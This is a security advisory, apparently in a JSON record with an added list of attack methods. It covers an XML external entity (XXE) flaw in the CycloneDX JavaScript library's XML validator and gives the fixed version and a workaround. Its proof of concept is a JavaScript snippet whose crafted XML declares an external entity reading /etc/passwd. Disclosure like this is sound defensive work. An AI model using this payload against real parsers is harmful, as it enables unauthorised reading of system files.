{"description": "### Impact\n\nXML External entity injections could be possible, when running the provided XML Validator on arbitrary input.\n\n#### POC\n\n```js\nconst {\n  Spec: { Version },\n  Validation: { XmlValidator }\n} = require('@cyclonedx/cyclonedx-library');\n\nconst version = Version.v1dot5;\nconst validator = new XmlValidator(version);\nconst input = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE poc [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<bom xmlns=\"http://cyclonedx.org/schema/bom/1.5\">\n  <components>\n    <component type=\"library\">\n      <name>testing</name>\n      <version>1.337</version>\n      <licenses>\n        <license>\n          <id>&xxe;</id><!-- << XML external entity (XXE) injection -->\n        </license>\n      </licenses>\n    </component>\n  </components>\n</bom>`;\n\n// validating this forged(^) input might lead to unintended behaviour\n// for the fact that the XML external entity would be taken into account.\nvalidator.validate(input).then(ve => {\n  console.error('validation error', ve);\n});\n```\n\n### Patches\n\nThis issue was fixed in `@cyclonedx/cyclonedx-library@6.7.1 `.\n\n\n\n### Workarounds\n\nDo not run the provided XML validator on untrusted inputs.\n\n### References\n\n* issue was introduced via <https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063>.  \n", "methods": ["Used XML External Entity (XXE) injection to inject malicious XML code.", "Used XML External Entity (XXE) injection to read local files (/etc/passwd).", "Used XML External Entity (XXE) injection to inject malicious data into the XML document.", "Used XML External Entity (XXE) injection to inject malicious data into the XML document, which was then used to validate the input."]}